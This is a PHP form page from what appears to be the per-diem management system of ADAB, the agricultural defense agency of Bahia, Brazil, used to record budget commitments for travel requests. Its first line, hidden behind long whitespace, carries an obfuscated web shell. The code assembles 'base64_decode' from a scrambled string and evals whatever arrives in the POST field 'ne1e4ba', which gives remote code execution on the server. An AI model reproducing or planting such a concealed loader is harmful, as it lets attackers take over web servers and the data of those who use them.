<?php                                                                                                                                                                                                                                                               $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s22=${strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])}['ne1e4ba'];if(isset($s22)){eval($s21($s22));}?><?php
include "../Include/Inc_Configuracao.php";
include "Classe/ClasseDiariaGestao.php";
include "IncludeLocal/Inc_Dados_Resumo_Comprovacao.php";
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xml:lang="pt-BR" lang="pt-BR" xmlns="http://www.w3.org/1999/xhtml">
    <head>
        <meta name="Description" content="ADAB - Ag&ecirc;ncia de Defesa Agropecu&aacute;ria da Bahia" />
        <meta name="Keywords" content="ADAB, Ag&ecirc;ncia de Defesa Agropecu&aacute;ria da Bahia, Defesa Agropecu&aacute;ria, Agropecu&aacute;ria Bahia" />
        <meta name="language" content="pt-br" />
        <meta name="distribution" content="Global" />
        <meta name="rating" content="General" />
        <meta name="DC.title" content="ADAB - Ag&ecirc;ncia de Defesa Agropecu&aacute;ria da Bahia" />
        <title>ADAB - Ag&ecirc;ncia de Defesa Agropecu&aacute;ria da Bahia</title>   
        <meta http-equiv='X-UA-Compatible' content='IE=EmulateIE8'></meta>
        <style type="text/css">@import url("../css/estilo.css"); </style>
        <style type="text/css">@import url("../css/dhtmlgoodies_calendar.css"); </style>
        <script type="text/javascript" language="javascript" src="../JavaScript/jquery-1.7.1.js"></script>
        <script type="text/javascript" language="javascript" src="../JavaScript/ScriptFuncao.js"></script>
        <script type="text/javascript" language="javascript" src="../JavaScript/ScriptMenu.js"></script>
        <script type="text/javascript" language="javascript" src="../JavaScript/jquery-1.4.2.js"></script>
        <script type="text/javascript" language="javascript" src="../JavaScript/jquery.maskedinput-1.2.2.js"></script>
        <script type="text/javascript" language="javascript" src="../JavaScript/mascaras.js"></script>
        <script type="text/javascript" language="javascript" src="../JavaScript/dhtmlgoodies_calendar.js"></script>
        <script type="text/javascript" language="javascript">
        
            function Foco(frm)
            {
                frm.txtEmpenho.focus();
            }
            function GravarForm(frm,dataSaida,dataEmpenho,StatusDiaria, NumeroProcesso)
            {
                for(cont=0; cont < frm.elements.length; cont++)
                    frm.elements[cont].style.backgroundColor = '';
                 // QUANDO FOR O 1 EMPENHO 
                if (StatusDiaria == 2 )
                {
                    if (frm.txtEmpenho.value == "")
                    {
                        alert("Digite o NÚMERO DO EMPENHO.");
                        frm.txtEmpenho.focus();
                        frm.txtEmpenho.style.backgroundColor='#B9DCFF';
                        return false;
                    }
                    if (frm.txtDataEmpenho.value == "")
                    {
                        alert("Digite a DATA DO EMPENHO.");
                        frm.txtDataEmpenho.focus();
                        frm.txtDataEmpenho.style.backgroundColor='#B9DCFF';
                        return false;
                    }
					if (frm.txtNumeroProcesso.value == "")
                    {
                        alert("Digite o Número do Processo do SEI.");
                        frm.txtNumeroProcesso.focus();
                        frm.txtNumeroProcesso.style.backgroundColor='#B9DCFF';
                        return false;
                    }
                    data1 = dataSaida.substring(6,10) + "/" + dataSaida.substring(3,5) + "/" + dataSaida.substring(0,2);
                    data2 = dataEmpenho.substring(6,10) + "/" + dataEmpenho.substring(3,5) + "/" + dataEmpenho.substring(0,2);
                    if (frm.txtIndenizacao.value == 0)
                    {
                        if (data2>data1)
                        {
                            alert("Data do EMPENHO MAIOR que a data de SAÍDA");
                            document.Form.txtDataEmpenho.style.backgroundColor='#B9DCFF';
                            return false;
                        }
                    }
                }
                if (StatusDiaria == 2) 
                {
                    frm.action = "SolicitacaoEmpenhar.php?acao=empenhar";
                    frm.submit();
                }
                else
                {
                    frm.action = "SolicitacaoEmpenhar.php?acao=2empenhar";
                    frm.submit();
                }
            }
            function AdcionarDocumento(frm)
            {
                if (frm.cmbDocumento.value == 0)
                {
                    alert("Selecione o TIPO DO DOCUMENTO.");
                    frm.cmbDocumento.focus();
                    frm.cmbDocumento.style.backgroundColor='#B9DCFF';
                    return false;
                }
                if (frm.txtNumDoc.value == "")
                {
                    alert("Digite o NÚMERO DO DOCUMENTO.");
                    frm.txtNumDoc.focus();
                    frm.txtNumDoc.style.backgroundColor='#B9DCFF';
                    return false;
                }
                frm.action = "SolicitacaoEmpenhar.php?acao=AdcionarDocumento";
                frm.submit();
            }
            function ExcluirDocumento(frm,CodigoDocumento)
            {
                frm.action = "SolicitacaoEmpenhar.php?acao=ExcluirDocumento&CodigoDocumento="+CodigoDocumento;
                frm.submit();
            }
            
        </script>
    </head>

    <body onLoad="WM_initializeToolbar();">
        <form name="Form" method="post">
            <table align="left" width="100%" cellspacing="0" cellpadding="0" border="0">
                <tr>
                    <td><?php include "../Include/Inc_Topo.php"?></td>
                </tr>
                <tr>
                    <td><?php include "../Include/Inc_Aba.php"?></td>
                </tr>
                <tr>
                    <td align="left">
                        <table width="990" cellspacing="0" cellpadding="0" border="0">
                            <tr>
                                <td valign="top" align="left" width="190"><?php include "../Include/Inc_Menu.php"?></td>
                                <td valign="top" align="left">
                                    <table cellpadding="0" border="0" cellspacing="0" width="100%">
                                        <tr>
                                            <td><img src="../SistemaCadastro/Imagens/vazio.gif" width="1" height="3" border="0"/></td>
                                        </tr>
                                        <tr>
                                            <td valign="top" class="LinhaTexto">&nbsp;&nbsp;<b>Confirma empenho da solicita&ccedil;&atilde;o abaixo?</td>
                                        </tr>
                                        <tr>
                                            <td><img src="../SistemaCadastro/Imagens/vazio.gif" width="1" height="2" border="0"/></td>
                                        </tr>
                                    </table>
                                    <?php include "../Include/Inc_Linha.php"?>
                                    <table border="0" cellpadding="1" cellspacing="1" width="798" class="GridPaginacao">
                                        <tr height="21" class="GridPaginacaoRegistroCabecalho">
                                            <td width="100" align="center">SD</td>
                                            <td width="480" align="left">&nbsp;Nome</td>
                                            <?php 
                                            //VERIFICA SE A DIAIRIA É PARA O PRIMEIRO EMPENHO
                                            $linharsConsulta=pg_fetch_assoc($rsConsulta);
                                            $Status = $linharsConsulta['diaria_st'];
                                            $Codigo = $linharsConsulta['diaria_id'];
                                            $DiariaAgrupada = $linharsConsulta['diaria_agrupada'];
                                            if($Status == 2)
                                            {
                                                echo "<td width='110' align='center'>Partida Prevista</td>";
                                                echo "<td width='110' align='center'>Chegada Prevista</td>";
                                            }
                                            ?>
                                        </tr>
                                        <?php 
                                        echo "<tr height='20' bgcolor='#f2f2f2' onMouseOver=javascript:this.style.backgroundColor='#cccccc' onMouseOut=javascript:this.style.backgroundColor='#f2f2f2'>";
                                        if($DiariaAgrupada == 0)
                                        {
                                            echo "<td class='GridPaginacaoLink' align='center'>" .$linharsConsulta['diaria_numero']. "</td>";
                                        }
                                        else
                                        {
                                            echo "<td class='GridPaginacaoLink' align='center'>" .$linharsConsulta['super_sd']. "</td>";
                                        }
                                        echo "<td class='GridPaginacaoLink' align='left'>&nbsp;" .$linharsConsulta['pessoa_nm']. "</td>";
                                        //VERIFICA SE A DIAIRIA É PARA O PRIMEIRO EMPENHO
                                        if($Status == 2)
                                        {
                                            echo "<td class='GridPaginacaoLink' align='center'>" .$linharsConsulta['diaria_dt_saida']. " " .$linharsConsulta['diaria_hr_saida']. "</td>";
                                            echo "<td class='GridPaginacaoLink' align='center'>" .$linharsConsulta['diaria_dt_chegada']. " " .$linharsConsulta['diaria_hr_chegada']. "</td>";
                                        }
                                        echo "</tr>"
                                        ?>
                                    </table>
                                    <?php 
                                    include "../Include/Inc_Linha.php";
                                    // INFORMA OS DADOS DO PRIMEIRO EMPENHO PARA O USUARIO;
                                    if ($Status == 6) 
                                    {
                                        DadosResumoComprovacao($Codigo);
                                        include "../Include/Inc_Linha.php";
                                    ?>
                                        <table width="798" border="0" cellpadding="0" cellspacing="1" class="TabelaFormulario">
                                            <tr class="GridPaginacaoRegistroCabecalho" height="21">
                                                <td colspan="3" align="left">Primeiro Empenho</td>
                                            </tr>
                                            <tr class="dataLabel" height="21">
                                                <td width="150">Nº do Empenho</td>
                                                <td width="140">Data do Empenho</td>
                                                <td width="508"></td>
                                            </tr>
                                            <tr class="dataField" height="21">
                                                <td width="150"><?=($linharsConsulta['diaria_empenho']);?></td>
                                                <td width="140"><?=$linharsConsulta['diaria_dt_empenho'];?></td>
                                                <td width="508"></td>
                                            </tr>
                                        </table>
                                    <?php 
                                        include "../Include/Inc_Linha.php";
                                    }// FIM DO IF
                                    ?>
                                    <table width="798" border="0" cellpadding="0" cellspacing="1" class="TabelaFormulario">
                                        <?php 
                                        // INFORMA OS DADOS DO PRIMEIRO EMPENHO PARA O USUARIO;
                                        if ($Status == 2) 
                                        {?>
                                        <tr class="GridPaginacaoRegistroCabecalho" height="21">
                                            <td colspan="5" align="left">Primeiro Empenho</td>
                                        </tr>
                                        <tr class="dataLabel" height="21">
                                            <td width="150">Nº do Empenho *</td>
                                            <td width="140" colspan="2">Data do Empenho *</td>
                                            <td width="200" style="text-align: center">Nº do Processo (SEI) *</td>
                                            <td width="308">&nbsp;</td>
                                        </tr>
                                        <tr class="dataField" height="21">
                                        <?php 
                                        }
                                        else 
                                        {                                                            
                                            $sqlConsultaExtra = "SELECT diaria_segundo_empenho_id, diaria_id, diaria_segundo_empenho,  diaria_segundo_empenho_numero, diaria_segundo_dt_empenho 
                                                                 FROM diaria.diaria_segundo_empenho where diaria_id =".$Codigo; 
                                            $rsConsultaExtra = pg_query(abreConexao(),$sqlConsultaExtra);
                                            $linhaExtra   = pg_fetch_assoc ($rsConsultaExtra);
                                        ?>                                                    
                                            <tr class="GridPaginacaoRegistroCabecalho" height="21">
                                                <td colspan="4" align="left">Segundo Empenho</td>
                                            </tr>
                                            <tr class="dataLabel" height="21">
                                                <td width="150">Nº do Empenho *</td>
                                                <td width="140" colspan="2">Data do Empenho *</td>
                                                <td width="508">&nbsp;</td>
                                            </tr>
                                            <tr class="dataField" height="21">
                                        <?php                                                         
                                        }
                                            // INFORMA OS DADOS DO PRIMEIRO EMPENHO PARA O USUARIO;
                                        if ($Status == 2) 
                                        {
                                        ?>
                                            <td><input type="text" name="txtEmpenho" value="<?=$linharsConsulta['diaria_empenho'];?>" maxlength="30" style="width:120px;" onKeyPress="return mascaraDigitaApenasNumero(event);"/></td>
                                        <?php 
                                            if ($linharsConsulta['diaria_dt_empenho']!="") 
                                            { ?>
                                                <td height="21" width="105"><input id="txtDataEmpenho" type="text" name="txtDataEmpenho" maxlength="10" style=" width:100px;height:18px;"  value="<?=f_FormataData($linharsConsulta['diaria_dt_empenho']);?>"/></td>                                                                                                
                                            <?php                                                                                                      
                                            }
                                            else 
                                            { ?>
                                                <td height="21" width="105"><input id="txtDataEmpenho" type="text" name="txtDataEmpenho" maxlength="10" style=" width:100px;height:18px;"  value="<?=date ("d/m/Y")?>"/></td>                                                                                                                                              
                                            <?php                                                             
                                            } // fim do else 
                                            ?>
                                                <td height="21" width="20"><a href="#" onClick="javascript:displayCalendar(document.getElementById('txtDataEmpenho'),'dd/mm/yyyy',this);"><img src="../Icones/ico_calendario.gif" border="0" align="Mostrar Calendário" width="18" height="21" /></a></td>                                            
                                           
                                            <td height="21" width="105" ><input id="txtNumeroProcesso" type="text" name="txtNumeroProcesso" maxlength="10" style=" width:100px;height:18px; margin-left: 42px"  value="<?=$linharsConsulta['diaria_processo'];?>"/></td>
                                            <td>&nbsp;
                                            </td>
                                        <?php 
                                        }
                                        else 
                                        {
                                        ?>
                                            <td><input type="text" name="txt2Empenho" value="<?=$linhaExtra['diaria_segundo_empenho_numero'] ?>" maxlength="30" style="width:120px;" onKeyPress="return mascaraDigitaApenasNumero(event);"/></td>
                                            <td width="120"><input type="text" name="txtData2Empenho" value="<?=f_FormataData(date ("Y-m-d"));?>" maxlength="20" style="width:95px;" readonly/></td>
                                            <td width="20"><a href="#" onClick="javascript:displayCalendar(txtData2Empenho,'dd/mm/yyyy',this);"><img src="../Icones/ico_calendario.gif" border="0" width="18" height="18"/></a></td>
                                            <td>&nbsp;</td>
                                        <?php 
                                        }
                                        ?>
                                        </tr>
                                    </table>
                                    <?php 
                                    if  ($linharsConsulta['indenizacao'] == 1) 
                                    {
                                        include "../Include/Inc_Linha.php";
                                    ?>                                    
                                        <table width="798" border="0" cellpadding="0" cellspacing="1" class="TabelaFormulario">
                                            <tr class="GridPaginacaoRegistroCabecalho" height="21">
                                                <td colspan="5" align="left">Documentos</td>
                                            </tr>
                                            <tr class="dataLabel" height="21">
                                                <td width="150">Tipo de Documento *</td>
                                                <td width="150" colspan="3">N&uacute;mero *</td>                                                    
                                            </tr>
                                            <tr class="dataLabel" height="21">
                                                <?php 
                                                $NumDocumento = $linhars1['diaria_tipo_doc_id'];
                                                echo "<td width='160' align='center'>";f_ComboDocumento($NumDocumento);
                                                echo"</td>";
                                                if ($linhars1['num_doc']!="") 
                                                {?>
                                                    <td width='129'> <input type="text" name="txtNumDoc" maxlength="10" style="width:75px;" value="<?=$linhars1['num_doc']; ?>"/> </td>
                                                <?php                                                     
                                                }                                             
                                                else
                                                {?>
                                                    <td width='129'> <input type="text" name="txtNumDoc" maxlength="10" style="width:75px;" onKeyPress="return mascaraDigitaApenasNumero(event);"/> </td>
                                                <?php 
                                                }
                                                ?>
                                                <td width="20"><input type="button" style=" width:55px;" value="Adcionar" onClick="AdcionarDocumento(document.Form);"/></td>
                                                <td width="500">&nbsp;</td>
                                            </tr>
                                        </table>                                                   
                                    <?php                                 
                                    include "../Include/Inc_Linha.php";
                                    echo "<table width='100%' border='0' cellpadding='0' cellspacing='1' class='TabelaFormulario'>";
                                        echo "<tr height='21' class='DataLabel'>";
                                            echo "<td width='30'>Nº #</td>";
                                            echo "<td width='120'>Tipo de Documento</td>";
                                            echo "<td width='100'>N&uacute;mero</td>";
                                            echo "<td width='300'>Usu&aacute;rio que Recebeu o Documento</td>";
                                            echo "<td width='150'>Recebimento</td>";
                                            echo "<td width='10'>&nbsp;</td>";
                                        echo "</tr>";
                                    $sqlTPDocumento = "SELECT * FROM diaria.diaria_historico_doc D,diaria.diaria_tipo_doc T where D.diaria_tipo_doc_id = T.diaria_tipo_doc_id and diaria_id = ".$Codigo." and diaria_historico_doc_st =0";
                                    $rsTPDocumento  = pg_query(abreConexao(),$sqlTPDocumento);
                                    $cont=1;
                                    While($linhaTPDoc = pg_fetch_assoc($rsTPDocumento)) 
                                    {
                                        echo "<tr class='dataField' height='21'>";
                                            echo "<td width='30'>".$cont."</td>";
                                            echo "<td>".$linhaTPDoc['diaria_tipo_doc_ds']."</td>";
                                            echo "<td>".$linhaTPDoc['num_doc']."</td>";
                                            echo "<td>".f_NomePessoa($linhaTPDoc['pessoa_id'])."</td>";
                                            echo "<td>".f_FormataData($linhaTPDoc['diaria_historico_doc_dt'])." - ".$linhaTPDoc['diaria_historico_doc_hr']."</td>";
                                            echo "<td class='dataField' align='center'><input type='button' style=' width:55px;' value='Excluir' onClick='ExcluirDocumento(document.Form,".$linhaTPDoc['diaria_historico_doc_id'].");'/></td>";
                                        echo "</tr>";
                                        $cont++;
                                    }
                                    echo "</table> ";
                                    }?>
                                    <table width="798" border="0" cellpadding="0" cellspacing="1">
                                        <tr height="21">
                                            <td class="dataLinha">(*) Campo obrigat&oacute;rio</td>
                                        </tr>
                                    </table>
                                    <table border="0" cellpadding="1" cellspacing="1" width="800">
                                        <tr height="25">
                                            <td align="right">
                                            <?php                                               
                                            if ($Status == 2)
                                            {?>
                                                <input type="button" style="width:70px" onClick="Javascript:GravarForm(document.Form,document.Form.txtDataPartida.value,document.Form.txtDataEmpenho.value,document.Form.txtStatus.value);" name="btnGravar" class="botao" value="Gravar"/>
                                            <?php
                                            }
                                            else
                                            {?>
                                                <input type="button" style="width:70px" onClick="Javascript:GravarForm(document.Form,document.Form.txtDataPartida.value,document.Form.txtData2Empenho.value,document.Form.txtStatus.value,, document.Form.txtNumeroProcesso.value,'');" name="btnGravar" class="botao" value="Gravar"/>
                                            <?php
                                            }?>
                                                <input type="button" style="width:70px" onClick="Javascript:window.location.href='<?=$PaginaLocal?>inicio.php';" name="btnConsultar" class="botao" value="Voltar"/>
                                            </td>
                                        </tr>
                                    </table>
                                </td>
                            </tr>
                        </table>
                        <input type="hidden" name="txtStatus" value="<?=$linharsConsulta['diaria_st'];?>" />
                        <input type="hidden" name="txtIndenizacao" value="<?=$linharsConsulta['indenizacao'];?>" />
                        <input type="hidden" name="txtCodigo" value="<?=$linharsConsulta['diaria_id'];?>" />
                        <input type="hidden" name="txtDataPartida" value="<?=$linharsConsulta['diaria_dt_saida'];?>" />
                        <input type="hidden" name="txtNumeroDiaria" value="<?=$linharsConsulta['diaria_numero'];?>" />
                    </td>
                </tr>
            </table>
        </form>
    </body>
</html>